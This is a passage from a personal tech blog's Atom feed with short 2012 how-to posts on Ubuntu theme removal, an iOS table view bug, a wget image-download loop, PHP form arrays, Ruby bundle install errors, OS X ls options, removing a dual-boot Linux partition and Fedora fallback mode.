    <link href="http://jslim.net/blog/2012/12/22/remove-macbuntu-from-ubuntu-12-dot-10/"/>
    <id>http://jslim.net/blog/2012/12/22/remove-macbuntu-from-ubuntu-12-dot-10/</id>
    <published>2012-12-22T00:23:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>About a month ago, I follow the instruction from <a href="http://www.noobslab.com/2012/11/install-mac-os-x-theme-on-ubuntu-1210.html">here</a> installed some components to make my desktop like OS X.</p><p>Unfortunately, I realize that the <a href="http://glx-dock.org/">Cairo-Dock</a> is damn annoying. When I want to click on it, it un-focus; when I don’t want to use it, it focus again. wtf!!!</p><p>Thus I decided to remove it.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">change the left dock icon back to ubuntu icon</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget -O ubuntu-logo.zip http://goo.gl/mU42p</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo unzip ubuntu-logo.zip -d /usr/share/unity/6/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">It will ask to replace file, Type <span class="string">&quot;A&quot;</span> and Press enter</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> ubuntu-logo.zip</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Uninstall Mac cursor</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /usr/share/icons/mac-cursors</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./uninstall-mac-cursors.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable back the crash report</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo sed -i <span class="string">&quot;s/enabled=0/enabled=1/g&quot;</span> <span class="string">&#x27;/etc/default/apport&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Finally, remove the cairo-dock</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get purge cairo-dock cairo-dock-plug-ins &amp;&amp; sudo apt-get autoremove</span></span><br></pre></td></tr></table></figure><p>Lastly, change back to Ubuntu original theme.<br>Search for <strong>appearance</strong></p><p><img src="/images/posts/2012-12-22-remove-macbuntu-from-ubuntu-12-dot-10/search_for_appearance.png" alt="Search for appearance"></p><p>Change the <strong>theme</strong></p><p><img src="/images/posts/2012-12-22-remove-macbuntu-from-ubuntu-12-dot-10/change_theme.png" alt="Change Theme"></p><p><em>References:</em></p><ul><li><em><a href="http://www.noobslab.com/2012/11/install-mac-os-x-theme-on-ubuntu-1210.html">INSTALL MAC OS X THEME ON UBUNTU 12.10 QUANTAL/UBUNTU 12.04/LINUX MINT 14</a></em></li><li><em><a href="http://askubuntu.com/questions/128698/cairo-dock-cant-find-plugins#answers">cairo dock cant find plugins?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;About a month ago, I follow the instruction from &lt;a</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="uninstallation" scheme="http://jslim.net/tags/uninstallation/"/>
    
  </entry>
  
  <entry>
    <title>iOS: UITabelView - didSelectRowAtIndexPath is not called</title>
    <link href="http://jslim.net/blog/2012/12/21/ios-uitabelview-didselectrowatindexpath-is-not-called/"/>
    <id>http://jslim.net/blog/2012/12/21/ios-uitabelview-didselectrowatindexpath-is-not-called/</id>
    <published>2012-12-21T07:03:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I had come across a problem which didSelectRowAtIndexPath doesn’t execute when I tap the cell.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)tableView:(<span class="built_in">UITableView</span> *)tableView didSelectRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Successfully tapped&quot;</span>);</span><br><span class="line">    <span class="built_in">UITableViewCell</span> *cell = [tableView cellForRowAtIndexPath:indexPath];</span><br><span class="line">    </span><br><span class="line">    [tableView deselectRowAtIndexPath:indexPath animated:<span class="literal">YES</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>No matter how I tap, it doesn’t show the <strong>log</strong>.</p><p><img src="/images/posts/2012-12-21-ios-uitabelview-didselectrowatindexpath-is-not-called/attributes_inspector.png" alt="Attributes Inspector"></p><p>As shown in the attribute inspector, the <strong>Selection</strong> is not <code>none</code>, <strong>User Interaction Enabled</strong> is also <code>checked</code>.</p><p>Finally, I found the problem…</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="built_in">NSIndexPath</span> *)tableView:(<span class="built_in">UITableView</span> *)tableView willSelectRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I forgot to remove <code>willSelectRowAtIndexPath</code> in <strong>ViewController</strong>.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I had come across a problem which didSelectRowAtIndexPath doesn’t execute when I tap the cell.&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Crawling sequantial images with shell script</title>
    <link href="http://jslim.net/blog/2012/12/19/crawling-sequantial-images-with-shell-script/"/>
    <id>http://jslim.net/blog/2012/12/19/crawling-sequantial-images-with-shell-script/</id>
    <published>2012-12-19T14:43:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Let say you want to download from <strong><a href="http://www.domain.com/images/">http://www.domain.com/images/</a></strong>, and you know that the images name is from <strong>001</strong> to <strong>100</strong></p><p>Lets write a shell script</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">max=100</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 <span class="variable">$max</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    url=`<span class="built_in">printf</span> <span class="string">&quot;http://www.domain.com/images/%03d.jpg&quot;</span> <span class="variable">$i</span>`</span><br><span class="line">    wget <span class="variable">$url</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><ol><li>First declare a maximum number for the images’ name</li><li>Write a <code>for</code> loop to iterate through from 1 _(as the images’ name is start from 1)_to the maximum</li><li>The command inside <em>backquote</em> (`) basically is refer to sub-command which will pass the output to the <code>url</code>. In this case is using <code>printf</code> to format the image name with trailing **00** in front if it then store in <code>url</code> variable</li><li>Finally use <code>wget</code> to download the images</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Let say you want to download from &lt;strong&gt;&lt;a href=&quot;http://www.domain.com/images/&quot;&gt;http://www.domain.com/images/&lt;/a&gt;&lt;/strong&gt;, and you</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="shell-script" scheme="http://jslim.net/tags/shell-script/"/>
    
  </entry>
  
  <entry>
    <title>How $_POST store array elements in PHP</title>
    <link href="http://jslim.net/blog/2012/12/08/how-$-post-store-array-elements-in-php/"/>
    <id>http://jslim.net/blog/2012/12/08/how-$-post-store-array-elements-in-php/</id>
    <published>2012-12-08T02:17:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Sometime we need an array form elements like this</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;a&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[3]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;b&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[7]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;d&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>But some of that contain key some didn’t. What will we actually get in php <code>$_POST</code>?</p><p>According to example above,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>will output:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    <span class="selector-attr">[0]</span> =&gt; <span class="selector-tag">a</span></span><br><span class="line">    <span class="selector-attr">[3]</span> =&gt; <span class="selector-tag">b</span></span><br><span class="line">    <span class="selector-attr">[4]</span> =&gt; c</span><br><span class="line">    <span class="selector-attr">[7]</span> =&gt; d</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>But let say the index is in <strong>string</strong> form</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;a&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[&#x27;3&#x27;]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;b&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;c&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;foo[&#x27;7&#x27;]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;d&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>will output:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    <span class="selector-attr">[0]</span> =&gt; <span class="selector-tag">a</span></span><br><span class="line">    <span class="selector-attr">[<span class="string">&#x27;3&#x27;</span>]</span> =&gt; <span class="selector-tag">b</span></span><br><span class="line">    <span class="selector-attr">[1]</span> =&gt; c</span><br><span class="line">    <span class="selector-attr">[<span class="string">&#x27;7&#x27;</span>]</span> =&gt; d</span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Sometime we need an array form elements like this&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
  </entry>
  
  <entry>
    <title>OS X failed bundle install</title>
    <link href="http://jslim.net/blog/2012/12/08/os-x-failed-bundle-install/"/>
    <id>http://jslim.net/blog/2012/12/08/os-x-failed-bundle-install/</id>
    <published>2012-12-08T02:10:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>When I try to setup octopress in OS X, I run <code>bundle install</code>, it always come out an error like:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ bundle install</span><br><span class="line">Fetching gem metadata from http://rubygems.org/.......</span><br><span class="line">Fetching gem metadata from http://rubygems.org/..</span><br><span class="line">/Users/jslim/.rvm/gems/ruby-1.9.3-p327@global/gems/bundler-1.2.3/lib/bundler.rb:263: warning: Insecure world writable <span class="built_in">dir</span> /usr/local/bin <span class="keyword">in</span> PATH, mode 040777</span><br><span class="line">Using rake (0.9.2.2) </span><br><span class="line">Installing RedCloth (4.2.9) with native extensions </span><br><span class="line">Gem::Installer::ExtensionBuildError: ERROR: Failed to build gem native extension.</span><br><span class="line"></span><br><span class="line">        /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/bin/ruby extconf.rb </span><br><span class="line">checking <span class="keyword">for</span> main() <span class="keyword">in</span> -lc... *** extconf.rb failed ***</span><br><span class="line">Could not create Makefile due to some reason, probably lack of</span><br><span class="line">necessary libraries and/or headers.  Check the mkmf.log file <span class="keyword">for</span> more</span><br><span class="line">details.  You may need configuration options.</span><br><span class="line"></span><br><span class="line">Provided configuration options:</span><br><span class="line">    --with-opt-dir</span><br><span class="line">    --without-opt-dir</span><br><span class="line">    --with-opt-include</span><br><span class="line">    --without-opt-include=<span class="variable">$&#123;opt-dir&#125;</span>/include</span><br><span class="line">    --with-opt-lib</span><br><span class="line">    --without-opt-lib=<span class="variable">$&#123;opt-dir&#125;</span>/lib</span><br><span class="line">    --with-make-prog</span><br><span class="line">    --without-make-prog</span><br><span class="line">    --srcdir=.</span><br><span class="line">    --curdir</span><br><span class="line">    --ruby=/Users/jslim/.rvm/rubies/ruby-1.9.3-p327/bin/ruby</span><br><span class="line">    --with-redcloth_scan-dir</span><br><span class="line">    --without-redcloth_scan-dir</span><br><span class="line">    --with-redcloth_scan-include</span><br><span class="line">    --without-redcloth_scan-include=<span class="variable">$&#123;redcloth_scan-dir&#125;</span>/include</span><br><span class="line">    --with-redcloth_scan-lib</span><br><span class="line">    --without-redcloth_scan-lib=<span class="variable">$&#123;redcloth_scan-dir&#125;</span>/lib</span><br><span class="line">    --with-clib</span><br><span class="line">    --without-clib</span><br><span class="line">/Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:369:<span class="keyword">in</span> `try_do<span class="string">&#x27;: The compiler failed to generate an executable file. (RuntimeError)</span></span><br><span class="line"><span class="string">You have to install development tools first.</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:449:in `try_link0&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:464:<span class="keyword">in</span> `try_link<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:607:in `try_func&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:833:<span class="keyword">in</span> `block <span class="keyword">in</span> have_library<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:778:in `block in checking_for&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:272:<span class="keyword">in</span> `block (2 levels) <span class="keyword">in</span> postpone<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:242:in `open&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:272:<span class="keyword">in</span> `block <span class="keyword">in</span> postpone<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:242:in `open&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:268:<span class="keyword">in</span> `postpone<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:777:in `checking_for&#x27;</span></span><br><span class="line">    from /Users/jslim/.rvm/rubies/ruby-1.9.3-p327/lib/ruby/1.9.1/mkmf.rb:828:<span class="keyword">in</span> `have_library<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    from extconf.rb:5:in `&lt;main&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Gem files will remain installed <span class="keyword">in</span> /Users/jslim/.rvm/gems/ruby-1.9.3-p327/gems/RedCloth-4.2.9 <span class="keyword">for</span> inspection.</span><br><span class="line">Results logged to /Users/jslim/.rvm/gems/ruby-1.9.3-p327/gems/RedCloth-4.2.9/ext/redcloth_scan/gem_make.out</span><br><span class="line">An error occurred <span class="keyword">while</span> installing RedCloth (4.2.9), and Bundler cannot <span class="built_in">continue</span>.</span><br><span class="line">Make sure that `gem install RedCloth -v <span class="string">&#x27;4.2.9&#x27;</span>` succeeds before bundling.</span><br></pre></td></tr></table></figure><p>First, run</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo xcodebuild -license</span><br><span class="line"><span class="variable">$ </span>sudo rvm reinstall <span class="number">1.9</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure><p>Now you should be able to perform <code>bundle install</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd <span class="regexp">/path/</span>to<span class="regexp">/your/</span>Gemfile</span><br><span class="line">$ bundle install</span><br></pre></td></tr></table></figure><p>It should work :)</p><p><em>Reference: <a href="http://stackoverflow.com/questions/13279856/the-compiler-failed-to-generate-an-executable-file-runtimeerror#answers">The compiler failed to generate an executable file. (RuntimeError)</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When I try to setup octopress in OS X, I run &lt;code&gt;bundle install&lt;/code&gt;, it always come out an error like:&lt;/p&gt;
&lt;figure class=&quot;highlight</summary>
        
      
    
    
    
    
    <category term="os-x" scheme="http://jslim.net/tags/os-x/"/>
    
    <category term="ruby" scheme="http://jslim.net/tags/ruby/"/>
    
    <category term="octopress" scheme="http://jslim.net/tags/octopress/"/>
    
  </entry>
  
  <entry>
    <title>ls command in OS X</title>
    <link href="http://jslim.net/blog/2012/12/08/ls-command-in-os-x/"/>
    <id>http://jslim.net/blog/2012/12/08/ls-command-in-os-x/</id>
    <published>2012-12-08T02:06:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p><code>ls</code> by default in OS X has no <code>--group-directories-first</code></p><p>Open up your terminal</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">brew </span><span class="keyword">install </span>coreutils</span><br></pre></td></tr></table></figure><p>Now you can use <code>gls</code> instead of just <code>ls</code></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">$ gls</span> <span class="literal">--</span><span class="comment">color</span> <span class="literal">--</span><span class="comment">group</span><span class="literal">-</span><span class="comment">directories</span><span class="literal">-</span><span class="comment">first</span> <span class="literal">-</span><span class="comment">p</span></span><br></pre></td></tr></table></figure><p>You can append an alias in your <code>~/.bash_profile</code></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> <span class="keyword">ls</span>=&#x27;gls <span class="params">--color</span> <span class="params">--group-directories-first</span> -p&#x27;</span><br></pre></td></tr></table></figure><p><em>Reference: <a href="https://github.com/skwp/dotfiles/issues/196">ls –group-directories-first</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;code&gt;ls&lt;/code&gt; by default in OS X has no &lt;code&gt;--group-directories-first&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Open up your terminal&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="os-x" scheme="http://jslim.net/tags/os-x/"/>
    
    <category term="mac" scheme="http://jslim.net/tags/mac/"/>
    
    <category term="command-line" scheme="http://jslim.net/tags/command-line/"/>
    
  </entry>
  
  <entry>
    <title>Delete Linux partition from dual-boot (Windows 7 &amp;amp; Linux)</title>
    <link href="http://jslim.net/blog/2012/11/30/delete-linux-partition-from-dual-boot-windows-7-and-linux/"/>
    <id>http://jslim.net/blog/2012/11/30/delete-linux-partition-from-dual-boot-windows-7-and-linux/</id>
    <published>2012-11-30T12:35:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>First time I did this by just delete the partition via <a href="http://www.softwareok.com/?seite=faq-Win-7&faq=15">Disk Management</a> on Windows 7. What is the consequence?</p><p>It turn up totally cannot boot into any OSes. That is be cause the GRUB bootloader is removed together.<br>This take me half day to figure it out, and struggling me.</p><p>Here is the step on how to safely remove the Linux.</p><h3 id="Using-Windows-7-boot-disc"><a href="#Using-Windows-7-boot-disc" class="headerlink" title="Using Windows 7 boot disc"></a>Using Windows 7 boot disc</h3><ol><li>Select a language, a time, a currency, a keyboard or an input method, and then click Next.</li><li>Choose <strong>Repair your computer</strong>.</li><li>Choose the option that you want to repair.</li><li>You’ll see some thing like this, then select <strong>Command Prompt</strong>.</li></ol><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/windows_7_repair.jpg" alt="Windows 7 Repair"></p><h3 id="Type-some-command-in-cmd"><a href="#Type-some-command-in-cmd" class="headerlink" title="Type some command in cmd"></a>Type some command in cmd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bootrec.exe /fixmbr</span><br><span class="line">bootrec.exe /fixboot</span><br></pre></td></tr></table></figure><p>Then reboot your machine. It should auto-boot into Windows 7 without letting you to select OSes.</p><h3 id="Delete-and-extend-partition"><a href="#Delete-and-extend-partition" class="headerlink" title="Delete and extend partition"></a>Delete and extend partition</h3><p>Now click on start menu and search for <strong>Computer Management</strong></p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/computer_management.png" alt="Computer Management"></p><p>Click on <strong>Disk Management</strong></p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/disk_management.png" alt="Disk Management"></p><p>Right-click the partition that you want to delete <em>(i.e. Linux partition in this case)</em>. Then select <strong>Delete Volume…</strong></p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/delete_volume.png" alt="Delete Volume"></p><p>You’ll get a <strong>Free Space</strong>. Now right-click the <strong>Free Space</strong> and <strong>Delete Partition…</strong></p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/delete_partition.png" alt="Delete Partition"></p><p>Now you get an <strong>Unallocated</strong> space. Right-click the drive before the <strong>Unallocated</strong> space <em>(i.e. D-drive in this case)</em>. Select <strong>Extend Volume…</strong></p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/extend_volume.png" alt="Extend Volume"></p><p>Finally, your drive has more space ^^</p><p><img src="/images/posts/2012-11-30-delete-linux-partition-from-dual-boot-windows-7-and-linux/completed.png" alt="Extended Successful"></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;First time I did this by just delete the partition via &lt;a href=&quot;http://www.softwareok.com/?seite=faq-Win-7&amp;faq=15&quot;&gt;Disk Management&lt;/a&gt;</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="windows" scheme="http://jslim.net/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Switch Fedora 17 to classic mode</title>
    <link href="http://jslim.net/blog/2012/11/27/switch-fedora-17-to-classic-mode/"/>
    <id>http://jslim.net/blog/2012/11/27/switch-fedora-17-to-classic-mode/</id>
    <published>2012-11-27T11:31:00.000Z</published>
    <updated>2022-05-09T09:30:48.609Z</updated>
    
    <content type="html"><![CDATA[<p>Although the OS that I like the most is <a href="http://old-releases.ubuntu.com/releases/natty/">Ubuntu 11.04</a>. Unfortunately, a lot of new packages or drivers were not supported. Thus, I give myself to try on other distro — <a href="http://fedoraproject.org/">Fedora 17</a></p><p>It come with <a href="http://www.gnome.org/gnome-3/">Gnome 3</a>, which is sxxx!!!<br><img src="/images/posts/2012-11-27-switch-fedora-17-to-classic-mode/fedora17-gnome3.png" alt="Gnome 3"></p><ul><li>Global <code>Alt + Tab</code></li><li>No horizontal workspaces (only verticle)</li></ul><p>Today, I found an article about switching it back to classic mode <em>(They call it <strong>Fallback mode</strong>)</em></p><p>First, search for keyword <code>system info</code><br><img src="/images/posts/2012-11-27-switch-fedora-17-to-classic-mode/system_info.png" alt="Searching"></p><p>Then, select <strong>Graphics</strong> and turned <strong>Forced Fallback Mode</strong> to <code>ON</code><br><img src="/images/posts/2012-11-27-switch-fedora-17-to-classic-mode/fallback_mode.png" alt="Fallback Mode"></p><p>After that, Logout and Login back. You should see the changes.</p><p><em>Reference:</em></p><ul><li><em><a href="http://www.zdnet.com/gnome-can-this-linux-desktop-be-saved-7000007856/">GNOME: Can this Linux desktop be saved?</a></em></li><li><em><a 